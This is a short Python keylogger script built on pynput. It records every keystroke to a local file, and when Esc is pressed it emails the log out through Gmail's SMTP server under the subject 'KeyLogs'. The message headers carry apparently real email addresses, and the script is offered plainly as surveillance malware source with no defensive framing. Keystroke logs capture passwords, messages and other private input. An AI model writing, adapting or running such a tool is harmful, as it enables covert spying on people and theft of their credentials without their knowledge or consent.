from pynput import keyboard
import smtplib
import ssl

sender_mail = "gmail"
receiver_mail = "gmail"
password = "yourpassword"
port = 465  # Use port 465 for SMTP_SSL
message = """From: ftddigitalstore9@gmail.com
To: p200557@pwr.nu.edu.pk                        
Subject: KeyLogs

Text: Keylogs 
"""

def write(text):
    with open("keylogger.txt", 'a') as f:
        f.write(text)

def on_key_press(key):
    try:
        if key == keyboard.Key.enter:
            write("\n")
        else:
            write(key.char)
    except AttributeError:
        if key == keyboard.Key.backspace:
            write("\nBackspace Pressed\n")
        elif key == keyboard.Key.tab:
            write("\nTab Pressed\n")
        elif key == keyboard.Key.space:
            write(" ")
        else:
            temp = repr(key) + " Pressed.\n"
            write(temp)
            print("\n{} Pressed\n".format(key))

def on_key_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()

with open("keylogger.txt", 'r') as f:
    temp = f.read()
    message = message + str(temp)

context = ssl.create_default_context()
server = smtplib.SMTP_SSL('smtp.gmail.com', port, context=context)
server.login(sender_mail, password)
server.sendmail(sender_mail, receiver_mail, message)
print("Email Sent to", sender_mail)
server.quit()